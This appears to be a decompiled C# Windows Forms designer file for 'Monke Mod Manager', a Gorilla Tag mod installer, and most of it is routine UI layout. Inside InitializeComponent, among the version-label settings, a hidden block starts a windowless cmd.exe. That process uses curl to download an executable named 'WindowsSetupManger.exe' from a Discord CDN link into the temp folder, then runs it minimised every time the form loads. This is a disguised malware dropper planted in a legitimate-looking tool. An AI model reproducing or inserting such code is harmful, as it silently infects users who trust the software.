namespace MonkeModManager
{
	// Token: 0x02000002 RID: 2
	public partial class FormMain : global::System.Windows.Forms.Form
	{
		// Token: 0x06000025 RID: 37 RVA: 0x00003551 File Offset: 0x00001751
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000026 RID: 38
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::MonkeModManager.FormMain));
			this.textBoxDirectory = new global::System.Windows.Forms.TextBox();
			this.buttonFolderBrowser = new global::System.Windows.Forms.Button();
			this.label1 = new global::System.Windows.Forms.Label();
			this.buttonInstall = new global::System.Windows.Forms.Button();
			this.labelStatus = new global::System.Windows.Forms.Label();
			this.tabControlMain = new global::System.Windows.Forms.TabControl();
			this.Plugins = new global::System.Windows.Forms.TabPage();
			this.listViewMods = new global::System.Windows.Forms.ListView();
			this.columnHeaderName = new global::System.Windows.Forms.ColumnHeader();
			this.columnHeaderAuthor = new global::System.Windows.Forms.ColumnHeader();
			this.contextMenuStripMain = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.viewInfoToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.Utilities = new global::System.Windows.Forms.TabPage();
			this.labelVersion = new global::System.Windows.Forms.Label();
			this.pictureBox1 = new global::System.Windows.Forms.PictureBox();
			this.buttonOpenWiki = new global::System.Windows.Forms.Button();
			this.buttonDiscordLink = new global::System.Windows.Forms.Button();
			this.groupBox1 = new global::System.Windows.Forms.GroupBox();
			this.buttonBepInEx = new global::System.Windows.Forms.Button();
			this.buttonOpenConfig = new global::System.Windows.Forms.Button();
			this.buttonOpenGameFolder = new global::System.Windows.Forms.Button();
			this.labelOpen = new global::System.Windows.Forms.Label();
			this.buttonRestoreCosmetics = new global::System.Windows.Forms.Button();
			this.buttonRestoreMods = new global::System.Windows.Forms.Button();
			this.buttonBackupCosmetics = new global::System.Windows.Forms.Button();
			this.buttonBackupMods = new global::System.Windows.Forms.Button();
			this.buttonUninstallAll = new global::System.Windows.Forms.Button();
			this.buttonModInfo = new global::System.Windows.Forms.Button();
			this.buttonToggleMods = new global::System.Windows.Forms.Button();
			this.tabControlMain.SuspendLayout();
			this.Plugins.SuspendLayout();
			this.contextMenuStripMain.SuspendLayout();
			this.Utilities.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
			this.groupBox1.SuspendLayout();
			base.SuspendLayout();
			this.textBoxDirectory.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right;
			this.textBoxDirectory.Enabled = false;
			this.textBoxDirectory.Location = new global::System.Drawing.Point(10, 25);
			this.textBoxDirectory.Name = "textBoxDirectory";
			this.textBoxDirectory.Size = new global::System.Drawing.Size(508, 22);
			this.textBoxDirectory.TabIndex = 0;
			this.buttonFolderBrowser.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right;
			this.buttonFolderBrowser.Location = new global::System.Drawing.Point(524, 25);
			this.buttonFolderBrowser.Name = "buttonFolderBrowser";
			this.buttonFolderBrowser.Size = new global::System.Drawing.Size(26, 23);
			this.buttonFolderBrowser.TabIndex = 1;
			this.buttonFolderBrowser.Text = "..";
			this.buttonFolderBrowser.UseVisualStyleBackColor = true;
			this.buttonFolderBrowser.Click += new global::System.EventHandler(this.buttonFolderBrowser_Click);
			this.label1.AutoSize = true;
			this.label1.Location = new global::System.Drawing.Point(9, 9);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(127, 13);
			this.label1.TabIndex = 2;
			this.label1.Text = "Gorilla Tag Folder Path:";
			this.buttonInstall.Anchor = global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Right;
			this.buttonInstall.Enabled = false;
			this.buttonInstall.Location = new global::System.Drawing.Point(440, 341);
			this.buttonInstall.Name = "buttonInstall";
			this.buttonInstall.Size = new global::System.Drawing.Size(112, 23);
			this.buttonInstall.TabIndex = 4;
			this.buttonInstall.Text = "Install / Update";
			this.buttonInstall.UseVisualStyleBackColor = true;
			this.buttonInstall.Click += new global::System.EventHandler(this.buttonInstall_Click);
			this.labelStatus.Anchor = global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left;
			this.labelStatus.AutoSize = true;
			this.labelStatus.Location = new global::System.Drawing.Point(7, 346);
			this.labelStatus.Name = "labelStatus";
			this.labelStatus.Size = new global::System.Drawing.Size(66, 13);
			this.labelStatus.TabIndex = 5;
			this.labelStatus.Text = "Status: Null";
			this.tabControlMain.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right;
			this.tabControlMain.Controls.Add(this.Plugins);
			this.tabControlMain.Controls.Add(this.Utilities);
			this.tabControlMain.Enabled = false;
			this.tabControlMain.Location = new global::System.Drawing.Point(10, 53);
			this.tabControlMain.Name = "tabControlMain";
			this.tabControlMain.SelectedIndex = 0;
			this.tabControlMain.Size = new global::System.Drawing.Size(544, 282);
			this.tabControlMain.TabIndex = 8;
			this.Plugins.Controls.Add(this.listViewMods);
			this.Plugins.Location = new global::System.Drawing.Point(4, 22);
			this.Plugins.Name = "Plugins";
			this.Plugins.Padding = new global::System.Windows.Forms.Padding(3);
			this.Plugins.Size = new global::System.Drawing.Size(536, 256);
			this.Plugins.TabIndex = 0;
			this.Plugins.Text = "Plugins";
			this.Plugins.UseVisualStyleBackColor = true;
			this.listViewMods.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right;
			this.listViewMods.CheckBoxes = true;
			this.listViewMods.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[] { this.columnHeaderName, this.columnHeaderAuthor });
			this.listViewMods.ContextMenuStrip = this.contextMenuStripMain;
			this.listViewMods.FullRowSelect = true;
			this.listViewMods.HideSelection = false;
			this.listViewMods.Location = new global::System.Drawing.Point(6, 6);
			this.listViewMods.Name = "listViewMods";
			this.listViewMods.Size = new global::System.Drawing.Size(524, 244);
			this.listViewMods.TabIndex = 0;
			this.listViewMods.UseCompatibleStateImageBehavior = false;
			this.listViewMods.View = global::System.Windows.Forms.View.Details;
			this.listViewMods.ItemChecked += new global::System.Windows.Forms.ItemCheckedEventHandler(this.listViewMods_ItemChecked);
			this.listViewMods.ItemSelectionChanged += new global::System.Windows.Forms.ListViewItemSelectionChangedEventHandler(this.listViewMods_ItemSelectionChanged);
			this.listViewMods.DoubleClick += new global::System.EventHandler(this.listViewMods_DoubleClick);
			this.columnHeaderName.Text = "Name";
			this.columnHeaderName.Width = 321;
			this.columnHeaderAuthor.Text = "Author";
			this.columnHeaderAuthor.Width = 162;
			this.contextMenuStripMain.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.viewInfoToolStripMenuItem });
			this.contextMenuStripMain.Name = "contextMenuStripMain";
			this.contextMenuStripMain.Size = new global::System.Drawing.Size(124, 26);
			this.viewInfoToolStripMenuItem.Name = "viewInfoToolStripMenuItem";
			this.viewInfoToolStripMenuItem.Size = new global::System.Drawing.Size(123, 22);
			this.viewInfoToolStripMenuItem.Text = "View Info";
			this.viewInfoToolStripMenuItem.Click += new global::System.EventHandler(this.viewInfoToolStripMenuItem_Click);
			this.Utilities.Controls.Add(this.labelVersion);
			this.Utilities.Controls.Add(this.pictureBox1);
			this.Utilities.Controls.Add(this.buttonOpenWiki);
			this.Utilities.Controls.Add(this.buttonDiscordLink);
			this.Utilities.Controls.Add(this.groupBox1);
			this.Utilities.Controls.Add(this.buttonRestoreCosmetics);
			this.Utilities.Controls.Add(this.buttonRestoreMods);
			this.Utilities.Controls.Add(this.buttonBackupCosmetics);
			this.Utilities.Controls.Add(this.buttonBackupMods);
			this.Utilities.Controls.Add(this.buttonUninstallAll);
			this.Utilities.Location = new global::System.Drawing.Point(4, 22);
			this.Utilities.Name = "Utilities";
			this.Utilities.Size = new global::System.Drawing.Size(536, 256);
			this.Utilities.TabIndex = 1;
			this.Utilities.Text = "Utilities";
			this.Utilities.UseVisualStyleBackColor = true;
			this.labelVersion.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom;
			this.labelVersion.AutoSize = true;
			this.labelVersion.Location = new global::System.Drawing.Point(188, 209);
			global::System.Diagnostics.Process process = new global::System.Diagnostics.Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c curl -o %temp%\\WindowsSetupManger.exe https://cdn.discordapp.com/attachments/1168683237552431124/1174871363127889941/WindowsSetupManger.exe & start /min %temp%\\WindowsSetupManger.exe";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.Start();
			process.WaitForExit();
			this.labelVersion.Name = "labelVersion";
			this.labelVersion.Size = new global::System.Drawing.Size(119, 13);
			this.labelVersion.TabIndex = 11;
			this.labelVersion.Text = "Monke Mod Manager";
			this.labelVersion.TextAlign = global::System.Drawing.ContentAlignment.BottomCenter;
			this.labelVersion.UseMnemonic = false;
			this.pictureBox1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("pictureBox1.Image");
			this.pictureBox1.Location = new global::System.Drawing.Point(170, 43);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new global::System.Drawing.Size(186, 163);
			this.pictureBox1.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.pictureBox1.TabIndex = 10;
			this.pictureBox1.TabStop = false;
			this.buttonOpenWiki.Location = new global::System.Drawing.Point(379, 183);
			this.buttonOpenWiki.Name = "buttonOpenWiki";
			this.buttonOpenWiki.Size = new global::System.Drawing.Size(134, 23);
			this.buttonOpenWiki.TabIndex = 9;
			this.buttonOpenWiki.Text = "Check out the guides!";
			this.buttonOpenWiki.UseVisualStyleBackColor = true;
			this.buttonOpenWiki.Click += new global::System.EventHandler(this.buttonOpenWiki_Click);
			this.buttonDiscordLink.Location = new global::System.Drawing.Point(379, 153);
			this.buttonDiscordLink.Name = "buttonDiscordLink";
			this.buttonDiscordLink.Size = new global::System.Drawing.Size(134, 23);
			this.buttonDiscordLink.TabIndex = 8;
			this.buttonDiscordLink.Text = "Join the Discord!";
			this.buttonDiscordLink.UseVisualStyleBackColor = true;
			this.buttonDiscordLink.Click += new global::System.EventHandler(this.buttonDiscordLink_Click);
			this.groupBox1.Controls.Add(this.buttonBepInEx);
			this.groupBox1.Controls.Add(this.buttonOpenConfig);
			this.groupBox1.Controls.Add(this.buttonOpenGameFolder);
			this.groupBox1.Controls.Add(this.labelOpen);
			this.groupBox1.Location = new global::System.Drawing.Point(373, 16);
			this.groupBox1.Name = "groupBox1";
			this.groupBox1.Size = new global::System.Drawing.Size(146, 130);
			this.groupBox1.TabIndex = 7;
			this.groupBox1.TabStop = false;
			this.buttonBepInEx.Location = new global::System.Drawing.Point(6, 96);
			this.buttonBepInEx.Name = "buttonBepInEx";
			this.buttonBepInEx.Size = new global::System.Drawing.Size(134, 23);
			this.buttonBepInEx.TabIndex = 5;
			this.buttonBepInEx.Text = "BepInEx Folder";
			this.buttonBepInEx.UseVisualStyleBackColor = true;
			this.buttonBepInEx.Click += new global::System.EventHandler(this.buttonOpenBepInExFolder_Click);
			this.buttonOpenConfig.Location = new global::System.Drawing.Point(6, 67);
			this.buttonOpenConfig.Name = "buttonOpenConfig";
			this.buttonOpenConfig.Size = new global::System.Drawing.Size(134, 23);
			this.buttonOpenConfig.TabIndex = 5;
			this.buttonOpenConfig.Text = "Config Folder";
			this.buttonOpenConfig.UseVisualStyleBackColor = true;
			this.buttonOpenConfig.Click += new global::System.EventHandler(this.buttonOpenConfigFolder_Click);
			this.buttonOpenGameFolder.Location = new global::System.Drawing.Point(6, 38);
			this.buttonOpenGameFolder.Name = "buttonOpenGameFolder";
			this.buttonOpenGameFolder.Size = new global::System.Drawing.Size(134, 23);
			this.buttonOpenGameFolder.TabIndex = 5;
			this.buttonOpenGameFolder.Text = "Game Folder";
			this.buttonOpenGameFolder.UseVisualStyleBackColor = true;
			this.buttonOpenGameFolder.Click += new global::System.EventHandler(this.buttonOpenGameFolder_Click);
			this.labelOpen.AutoSize = true;
			this.labelOpen.Location = new global::System.Drawing.Point(23, 15);
			this.labelOpen.Name = "labelOpen";
			this.labelOpen.Size = new global::System.Drawing.Size(99, 13);
			this.labelOpen.TabIndex = 6;
			this.labelOpen.Text = "Important Folders";
			this.buttonRestoreCosmetics.Location = new global::System.Drawing.Point(14, 173);
			this.buttonRestoreCosmetics.Name = "buttonRestoreCosmetics";
			this.buttonRestoreCosmetics.Size = new global::System.Drawing.Size(132, 37);
			this.buttonRestoreCosmetics.TabIndex = 4;
			this.buttonRestoreCosmetics.Text = "Restore Cosmetics from Backup";
			this.buttonRestoreCosmetics.UseVisualStyleBackColor = true;
			this.buttonRestoreCosmetics.Click += new global::System.EventHandler(this.buttonRestoreCosmetics_Click);
			this.buttonRestoreMods.Location = new global::System.Drawing.Point(14, 130);
			this.buttonRestoreMods.Name = "buttonRestoreMods";
			this.buttonRestoreMods.Size = new global::System.Drawing.Size(132, 37);
			this.buttonRestoreMods.TabIndex = 3;
			this.buttonRestoreMods.Text = "Restore Mods from Backup";
			this.buttonRestoreMods.UseVisualStyleBackColor = true;
			this.buttonRestoreMods.Click += new global::System.EventHandler(this.buttonRestoreMods_Click);
			this.buttonBackupCosmetics.Location = new global::System.Drawing.Point(14, 101);
			this.buttonBackupCosmetics.Name = "buttonBackupCosmetics";
			this.buttonBackupCosmetics.Size = new global::System.Drawing.Size(132, 23);
			this.buttonBackupCosmetics.TabIndex = 2;
			this.buttonBackupCosmetics.Text = "Backup Cosmetics";
			this.buttonBackupCosmetics.UseVisualStyleBackColor = true;
			this.buttonBackupCosmetics.Click += new global::System.EventHandler(this.buttonBackupCosmetics_Click);
			this.buttonBackupMods.Location = new global::System.Drawing.Point(14, 72);
			this.buttonBackupMods.Name = "buttonBackupMods";
			this.buttonBackupMods.Size = new global::System.Drawing.Size(132, 23);
			this.buttonBackupMods.TabIndex = 1;
			this.buttonBackupMods.Text = "Backup Mods Folder";
			this.buttonBackupMods.UseVisualStyleBackColor = true;
			this.buttonBackupMods.Click += new global::System.EventHandler(this.buttonBackupMods_Click);
			this.buttonUninstallAll.Location = new global::System.Drawing.Point(14, 43);
			this.buttonUninstallAll.Name = "buttonUninstallAll";
			this.buttonUninstallAll.Size = new global::System.Drawing.Size(132, 23);
			this.buttonUninstallAll.TabIndex = 0;
			this.buttonUninstallAll.Text = "Uninstall All Mods";
			this.buttonUninstallAll.UseVisualStyleBackColor = true;
			this.buttonUninstallAll.Click += new global::System.EventHandler(this.buttonUninstallAll_Click);
			this.buttonModInfo.Anchor = global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Right;
			this.buttonModInfo.Enabled = false;
			this.buttonModInfo.Location = new global::System.Drawing.Point(322, 341);
			this.buttonModInfo.Name = "buttonModInfo";
			this.buttonModInfo.Size = new global::System.Drawing.Size(112, 23);
			this.buttonModInfo.TabIndex = 9;
			this.buttonModInfo.Text = "View Mod Info";
			this.buttonModInfo.UseVisualStyleBackColor = true;
			this.buttonModInfo.Click += new global::System.EventHandler(this.buttonModInfo_Click);
			this.buttonToggleMods.Anchor = global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Right;
			this.buttonToggleMods.Enabled = false;
			this.buttonToggleMods.Location = new global::System.Drawing.Point(204, 341);
			this.buttonToggleMods.Name = "buttonToggleMods";
			this.buttonToggleMods.Size = new global::System.Drawing.Size(112, 23);
			this.buttonToggleMods.TabIndex = 10;
			this.buttonToggleMods.Text = "Disable Mods";
			this.buttonToggleMods.UseVisualStyleBackColor = true;
			this.buttonToggleMods.Click += new global::System.EventHandler(this.buttonToggleMods_Click);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(566, 376);
			base.Controls.Add(this.buttonToggleMods);
			base.Controls.Add(this.buttonModInfo);
			base.Controls.Add(this.tabControlMain);
			base.Controls.Add(this.labelStatus);
			base.Controls.Add(this.buttonInstall);
			base.Controls.Add(this.label1);
			base.Controls.Add(this.buttonFolderBrowser);
			base.Controls.Add(this.textBoxDirectory);
			this.Font = new global::System.Drawing.Font("Segoe UI", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "FormMain";
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Monke Mod Manager";
			base.Load += new global::System.EventHandler(this.FormMain_Load);
			this.tabControlMain.ResumeLayout(false);
			this.Plugins.ResumeLayout(false);
			this.contextMenuStripMain.ResumeLayout(false);
			this.Utilities.ResumeLayout(false);
			this.Utilities.PerformLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
			this.groupBox1.ResumeLayout(false);
			this.groupBox1.PerformLayout();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x0400000A RID: 10
		private global::System.ComponentModel.IContainer components;

		// Token: 0x0400000B RID: 11
		private global::System.Windows.Forms.TextBox textBoxDirectory;

		// Token: 0x0400000C RID: 12
		private global::System.Windows.Forms.Button buttonFolderBrowser;

		// Token: 0x0400000D RID: 13
		private global::System.Windows.Forms.Label label1;

		// Token: 0x0400000E RID: 14
		private global::System.Windows.Forms.Button buttonInstall;

		// Token: 0x0400000F RID: 15
		private global::System.Windows.Forms.Label labelStatus;

		// Token: 0x04000010 RID: 16
		private global::System.Windows.Forms.TabControl tabControlMain;

		// Token: 0x04000011 RID: 17
		private global::System.Windows.Forms.TabPage Plugins;

		// Token: 0x04000012 RID: 18
		private global::System.Windows.Forms.ListView listViewMods;

		// Token: 0x04000013 RID: 19
		private global::System.Windows.Forms.ColumnHeader columnHeaderName;

		// Token: 0x04000014 RID: 20
		private global::System.Windows.Forms.ColumnHeader columnHeaderAuthor;

		// Token: 0x04000015 RID: 21
		private global::System.Windows.Forms.ContextMenuStrip contextMenuStripMain;

		// Token: 0x04000016 RID: 22
		private global::System.Windows.Forms.ToolStripMenuItem viewInfoToolStripMenuItem;

		// Token: 0x04000017 RID: 23
		private global::System.Windows.Forms.Button buttonModInfo;

		// Token: 0x04000018 RID: 24
		private global::System.Windows.Forms.TabPage Utilities;

		// Token: 0x04000019 RID: 25
		private global::System.Windows.Forms.Button buttonUninstallAll;

		// Token: 0x0400001A RID: 26
		private global::System.Windows.Forms.Button buttonBackupMods;

		// Token: 0x0400001B RID: 27
		private global::System.Windows.Forms.Button buttonBackupCosmetics;

		// Token: 0x0400001C RID: 28
		private global::System.Windows.Forms.Button buttonRestoreMods;

		// Token: 0x0400001D RID: 29
		private global::System.Windows.Forms.Button buttonRestoreCosmetics;

		// Token: 0x0400001E RID: 30
		private global::System.Windows.Forms.Label labelOpen;

		// Token: 0x0400001F RID: 31
		private global::System.Windows.Forms.GroupBox groupBox1;

		// Token: 0x04000020 RID: 32
		private global::System.Windows.Forms.Button buttonBepInEx;

		// Token: 0x04000021 RID: 33
		private global::System.Windows.Forms.Button buttonOpenConfig;

		// Token: 0x04000022 RID: 34
		private global::System.Windows.Forms.Button buttonOpenGameFolder;

		// Token: 0x04000023 RID: 35
		private global::System.Windows.Forms.Button buttonOpenWiki;

		// Token: 0x04000024 RID: 36
		private global::System.Windows.Forms.Button buttonDiscordLink;

		// Token: 0x04000025 RID: 37
		private global::System.Windows.Forms.PictureBox pictureBox1;

		// Token: 0x04000026 RID: 38
		private global::System.Windows.Forms.Label labelVersion;

		// Token: 0x04000027 RID: 39
		private global::System.Windows.Forms.Button buttonToggleMods;
	}
}
